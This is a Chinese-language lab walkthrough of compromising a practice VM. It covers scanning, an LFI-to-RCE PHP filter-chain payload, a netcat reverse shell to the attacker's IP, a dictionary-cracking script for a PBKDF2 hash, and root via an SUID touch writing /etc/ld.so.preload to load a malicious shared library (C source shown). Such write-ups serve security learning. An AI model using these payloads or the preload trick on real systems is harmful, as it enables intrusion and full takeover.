# 0.简介

这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习

目标 IP：192.168.205.137
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST
Nmap scan report for 192.168.205.137
Host is up (0.00021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 - \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:97:BD:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.205.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
                                                                
```

# 2.踩点

![image-20250331190947415](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190947584.png)

测文件包含，测完了也没结果，所以来个目录爆破先

```
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.137
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, md, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       48l      102w     2359c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        7l       10w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET        3l        1w       16c http://192.168.205.137/test.php
200      GET        2l        1w       17c http://192.168.205.137/tools.php
200      GET        1l        3w      228c http://192.168.205.137/README.md
200      GET        2l        1w       15c http://192.168.205.137/pp.php
```

探索一下

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/test.php                
<h1>test</h1>


                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/tools.php
<h1>tools</h1>
 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/pp.php   
<h1>test</h1>

                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/README.md
2025年1月22日　本プロジェクトの開発は一旦ここで終了です。正式にプロジェクトが2月に公開される前に、テスト部分を必ず整理してください。——開発チーム　アダシ
                        
```

前面在首页可以看到是用do函数传参，所以我们测试一下

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/test.php?do=../../../etc/passwd
<h1>test</h1>
self-hacking!                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/tools.php?do=../../../etc/passwd
<h1>tools</h1>
 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/pp.php?do=../../../etc/passwd
<h1>test</h1>
try
                   
```

两个有反应，tools没反应，我用的是pp.php

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.137/pp.php?do=php://filter/convert.base64-encode/resource=../../../../etc/passwd
> 
<h1>test</h1>
trycm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTEwOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDU6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgp3ZWxjb21lOng6MTAwMToxMDAxOjovaG9tZS93ZWxjb21lOi9iaW4vc2gKbXlzcWw6eDoxMDY6MTEzOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=
                                                          
```

有回显，所以测一下php filter

```
http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id
```

![image-20250331190958726](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190958775.png)

弹shell

```
http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc%20192.168.205.128%208888%20-e%20/bin/bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.137] 50510
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@listen:~/html/wordpress$ ls -al
total 60
drwxr-xr-x 2 www-data www-data 4096 Feb  1 21:51 .
drwxr-xr-x 3 root     root     4096 Jan  7 23:52 ..
-rw-r--r-- 1 root     root       92 Feb  1 11:13 .2024_12_25_project_web_login_password.bak
-rw-r--r-- 1 root     root      228 Feb  1 09:50 README.md
-rw-r--r-- 1 root     root     1783 Feb  1 09:33 album_1.php
-rw-r--r-- 1 root     root     2004 Feb  1 09:32 album_2.php
-rw-r--r-- 1 root     root     1861 Feb  1 09:31 album_3.php
-rw-r--r-- 1 root     root     1781 Feb  1 09:30 album_4.php
-rw-r--r-- 1 root     root     2057 Feb  1 09:26 album_5.php
-rw-r--r-- 1 root     root     2359 Feb  1 09:12 home.php
-rw-r--r-- 1 root     root      315 Feb  1 09:07 index.php
-rw-r--r-- 1 root     root      219 Feb  1 21:48 pp.php
-rw-r--r-- 1 root     root     3972 Feb  1 09:23 styles.css
-rw-r--r-- 1 root     root      675 Feb  1 21:51 test.php
-rw-r--r-- 1 root     root      153 Feb  1 09:37 tools.php
www-data@listen:~/html/wordpress$ cat .2024_12_25_project_web_login_password.bak
pbkdf2:sha256:50000:flower:0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028
```

看样子要破解这个hash

```
┌──(kali㉿kali)-[~/test]
└─$ cat tmp.py
import hashlib
import binascii
from concurrent.futures import ProcessPoolExecutor, as_completed
from tqdm import tqdm

def pbkdf2_sha256(password, salt, iterations=50000, dklen=32):
    """使用PBKDF2-HMAC-SHA256算法计算哈希"""
    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), iterations, dklen)

def check_password(password_chunk, target_hash, salt, iterations):
    """检查给定密码块中的每个密码是否匹配目标哈希"""
    results = []
    for password in tqdm(password_chunk, desc="Processing chunk", unit="passwords"):
        password = password.strip()
        hashed_password = pbkdf2_sha256(password, salt, iterations)
        if binascii.hexlify(hashed_password).decode() == target_hash:
            results.append(password)
    return results

def crack_pbkdf2_hash(target_hash, salt, iterations=50000, dictionary_file='/usr/share/wordlists/rockyou.txt'):
    """尝试通过字典攻击破解PBKDF2哈希"""
    chunk_size = 1000  # 每个进程处理的密码数量
    passwords = []
    with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as file:
        while True:
            password_chunk = list(islice(file, chunk_size))
            if not password_chunk:
                break
            passwords.append(password_chunk)

    with ProcessPoolExecutor() as executor:
        futures = [executor.submit(check_password, chunk, target_hash, salt, iterations) for chunk in passwords]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"找到密码: {result}")
                return result
    print("字典中没有找到匹配的密码")
    return None

if __name__ == '__main__':
    from itertools import islice
  
    target_hash = "0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028"
    salt = "flower"
  
    crack_pbkdf2_hash(target_hash, salt)
                                                       
┌──(kali㉿kali)-[~/test]
└─$ python3 tmp.py
找到密码: ['roseflower']
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ grep -r -w -n "roseflower" /usr/share/wordlists/rockyou.txt                            
122049:roseflower
                                   
```

还挺后

```
www-data@listen:~/html/wordpress$ ls -la /home/
total 12
drwxr-xr-x  3 root    root    4096 Jan  7 23:16 .
drwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..
drwx------  2 welcome welcome 4096 Feb  1 11:10 welcome
www-data@listen:~/html/wordpress$ su - welcome
Password: 
$ id                                                                                                                                 
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

继续

```
welcome@listen:~$ ls -al
total 20
drwx------ 2 welcome welcome 4096 Feb  1 11:10 .
-rw-r--r-- 1 root    root      11 Feb  1 11:10 .-
drwxr-xr-x 3 root    root    4096 Jan  7 23:16 ..
-rw------- 1 welcome welcome   69 Feb  1 07:13 .bash_history
-rw-r--r-- 1 root    root      33 Jan  7 23:18 user.txt
welcome@listen:~$ cat .bash_history
sudo -l
cat /etc/passwd
poweroff
ls
whoami
cd /root
whoami
su - root
welcome@listen:~$ sudo -l
[sudo] password for welcome: 
Sorry, user welcome may not run sudo on listen.
welcome@listen:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/touch
/usr/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

/usr/bin/touch是多的，找一下怎么提权吧，找半天也找不到，我就等群u的wp了

![image-20250331191023675](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191023738.png)

过修改 /etc/ld.so.preload 文件实现获得 root 权限，我们跟着实现一下

查看一下touch命令的so的跟踪流

```
┌──(kali㉿kali)-[~/test]
└─$ strace touch 2>&1 | grep -Pi "open|access|no such file"
strace: Symbol `_UPT_accessors' has different size in shared object, consider re-linking
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (没有那个文件或目录)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/share/locale/locale.alias", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/share/locale/zh_CN.UTF-8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (没有那个文件或目录)
openat(AT_FDCWD, "/usr/share/locale/zh_CN.utf8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (没有那个文件或目录)
openat(AT_FDCWD, "/usr/share/locale/zh_CN/LC_MESSAGES/coreutils.mo", O_RDONLY) = 3
openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY|O_CLOEXEC) = 3
```

/etc/ld.so.preload 是缺失的，我们去靶机看看

```
welcome@listen:~$ ls -la /etc/ld.so.preload                                                                                          
ls: cannot access '/etc/ld.so.preload': No such file or directory   
```

那简单了，我们去创建一个恶意so就好了

🔗https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/write-to-root.html

在kali创建一个恶意so

```
┌──(kali㉿kali)-[~/test]
└─$ cat exp.c 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>  // 包含 unlink(), setuid(), setgid() 等函数

void _init() {
    // 删除 /etc/ld.so.preload 文件
    unlink("/etc/ld.so.preload");

    // 提升权限，设置为 root 用户和组
    setgid(0);    // 设置为 root 组
    setuid(0);    // 设置为 root 用户

    // 执行 shell（如需要）
    system("/bin/bash");
}
   
┌──(kali㉿kali)-[~/test]
└─$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles
                                                     
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.141 - - [03/Feb/2025 17:31:20] "GET /exp.so HTTP/1.1" 200 -
welcome@listen:/tmp$ wget 192.168.205.128/exp.so
--2025-02-03 04:31:04--  http://192.168.205.128/exp.so
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14152 (14K) [application/octet-stream]
Saving to: ‘exp.so’

exp.so                                                       0%[                                                                       exp.so                                                     100%[========================================================================================================================================>]  13.82K  --.-KB/s    in 0s    

2025-02-03 04:31:04 (91.0 MB/s) - ‘exp.so’ saved [14152/14152]

welcome@listen:/tmp$ chmod +x exp.so 
welcome@listen:/tmp$ umask 000
welcome@listen:/tmp$ touch /etc/ld.so.preload
welcome@listen:/tmp$ ls -al /etc/ld.so.preload
-rw-rw-rw- 1 root root 0 Feb  3 04:31 /etc/ld.so.preload
welcome@listen:/tmp$ echo "/tmp/exp.so" > /etc/ld.so.preload
welcome@listen:/tmp$ touch test
root@listen:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(welcome)
```

<!-- ##{"timestamp":1738580133}## -->